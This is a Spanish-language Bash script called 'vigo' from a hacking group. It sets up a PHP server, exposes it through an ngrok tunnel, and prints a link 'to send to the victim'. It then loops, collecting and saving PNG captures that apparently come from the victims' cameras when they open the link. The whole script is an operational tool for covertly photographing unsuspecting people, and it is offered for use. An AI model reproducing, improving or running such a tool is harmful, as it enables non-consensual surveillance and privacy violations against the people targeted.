#!/bin/bash
#
# [Open Source] - [Código Abierto]
#
# vigo: (11/02/2021)
#
# Variables
#
trap ctrl_c 2
OS=$(uname -o)
PWD=$(pwd)
#
# Colores Resaltados
#
negro="[1;30m"
azul="[1;34m"
verde="[1;32m"
cian="[1;36m"
rojo="[1;31m"
purpura="[1;35m"
amarillo="[1;33m"
blanco="[1;37m"
#
# Colores Bajos
#
black="[0;30m"
blue="[0;34m"
green="[0;32m"
cyan="[0;36m"
red="[0;31m"
purple="[0;35m"
yellow="[0;33m"
white="[0;37m"
#
# Dependencias de vigo
#
Dependencies(){
	if [ "${OS}" == "Android" ]; then
		if [ -d "/storage/emulated/0/Capturadas" ]; then
			SAVE="/storage/emulated/0/Capturadas"
		else
			SAVE="/storage/emulated/0/Capturadas"
			mkdir -p "/storage/emulated/0/Capturadas"
		fi
		if [ -x ${PREFIX}/bin/php ]; then
			SAVE="/storage/emulated/0/Capturadas"
		else
			SAVE="/storage/emulated/0/Capturadas"
			pkg install php -y
		fi
		if [ -x ${PREFIX}/bin/curl ]; then
			SAVE="/storage/emulated/0/Capturadas"
		else
			SAVE="/storage/emulated/0/Capturadas"
			pkg install curl -y
		fi
	else
		if [ -x /bin/php ]; then
			SAVE=$(pwd)
		else
			SAVE=$(pwd)
			apt-get install php -y
		fi
		if [ -x /bin/curl ]; then
			SAVE=$(pwd)
		else
			SAVE=$(pwd)
			apt-get install curl -y
		fi
	fi
}
CheckNgrok(){
	if [ -x ${PWD}/ngrok ]; then
		sleep 0.1
	else
		git clone https://github.com/Darkmux/NgrokTH
		mv ${PWD}/NgrokTH/ngrok ${PWD}
		chmod 777 ngrok
		rm -rf NgrokTH
	fi
}
#
# Capturando Ctrl + C
#
ctrl_c(){
echo -e "${yellow}
[${red}!${yellow}] ${red}Proceso interrumpido por el usuario."${white}
exit
}
#
# Banner Vigo
#
Vigo(){
	sleep 0.5
	clear
echo -e "${cyan}
                                         ,,;;,,
                                        :.cxxc.:
                                         :¨¨¨¨:
                                          c..c
                                    xolcc:,..,:cclox
                                o:'.,odxOO0000OOxdo,.':o
                              l,cko.cXMMMWWWWWWMMMXc.okc,l
                             :'xXXx'.:olcc::::ccloc.'xXXx':
                         d:do.cOo,....................,oOc.od:o
                        O'.:c.ok,..';;'................'dc.c:..x
                        O'.:c.ok'.,dOOd,........,cll:..'oc.c:..x
                         l,ll.ok' 'lddc.........',.',..'oc.ll,c
                             .lk:. ....               .;d:.
                              ':lc:;'......  ......';:cl:'
                                '.,;::::::::::::::::;,.'
                                ,,..;:,,;,;;;,;;'';,..,
                               ,xk,,0KokK0OkkkOOdckx',O
                                OO;'kKldOOkxxxdxlcxd.;O
                                 c'.c0xxXX0000OOolx;.'c
                                   l,cxd0NNXXNNOll:,cl
                                    O:;,cONWWNO:,,:O
                                      Ol;;cclc;;lO
                                         0kkkk0"
echo -e ${yellow}'
                                       d8,
                                      `8P

                            ?88   d8P  88b d888b8b   d8888b'
echo -e ${yellow}"                            d88  d8P'  88Pd8P' ?88  d8P' ?88
                            ?8b ,88'  d88 88b  ,88b 88b  d88
                            '?888P'  d88' '?88P''88b'?8888P'
                                                 )88
                                                ,88P
                                            '?8888P"
echo -e ${red}"
                         ________________________________________
                        ${white}|_________ Informática y Hacking ________|
                        ${red}|________________________________________|
                        ${white}|_____https://informaticayhacking.com____|
                        ${red}|________________________________________|
                        ${white}|_______t.me/Informatica_y_Hacking_______|
                        ${red}|________________________________________|

			   ${red}Creado por: ${white}System Failure y Darkmux
"${white}
}
#
# Matando Procesos [ php - ngrok ]
#
CheckProcess(){
	NGROK=$(ps aux | grep -o "ngrok" | head -n1)
	PHP=$(ps aux | grep -o "php" | head -n1)

	if [[ ${NGROK} == *'ngrok'* ]]; then
		pkill -f -2 ngrok > /dev/null 2>&1
		killall -2 ngrok > /dev/null 2>&1
	fi
	if [[ ${PHP} == *'php'* ]]; then
		pkill -f -2 php > /dev/null 2>&1
		killall -2 php > /dev/null 2>&1
	fi
}
#
# Iniciando Servidor PHP
#
ServerPHP(){
Vigo
php -S 127.0.0.1:4546 -t ${PWD}/vigo/foto > /dev/null 2>&1 &
./ngrok http 4546 > /dev/null 2>&1 &
echo -e "${green}
[${white}-${green}] ${cyan}Iniciando servidor..."
sleep 10
LINK=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
}
#
# Interactuando a la Víctima
#
LinkNgrok(){
Vigo
echo -e "${green}[${white}-${green}] Enlace para enviar a la víctima:${white} ${LINK}"
echo -e "${cyan}
[${white}-${cyan}] Esperando interacción de la víctima...

${green}[${white}-${green}]${yellow}Si la interacción tarda demasiado,
${green}[${white}-${green}]${yellow}Presione ${red}Ctrl + C ${yellow}para salir.
"${blanco}
}
Interaction(){
while [ true ]; do
CAPTURA=$(basename ${PWD}/vigo/foto/captura/*.png)
if [[ -f "${PWD}/vigo/foto/captura/${CAPTURA}" ]]; then
echo -e "${green}
[${white}-${green}] ${yellow}La captura ha sido obtenida con éxito..!"
cp ${PWD}/vigo/foto/captura/*.png ${SAVE}
rm ${PWD}/vigo/foto/captura/*.png
echo -e "${green}
[${white}-${green}] ${cyan}Se ha guardado en:${white} ${SAVE}/${CAPTURA}"
fi
done
}
#
# Declarando Funciones
#
Dependencies
CheckNgrok
CheckProcess
ServerPHP
LinkNgrok
Interaction
#Creado por: System Failure y Darkmux - Informática y Hacking © 2021
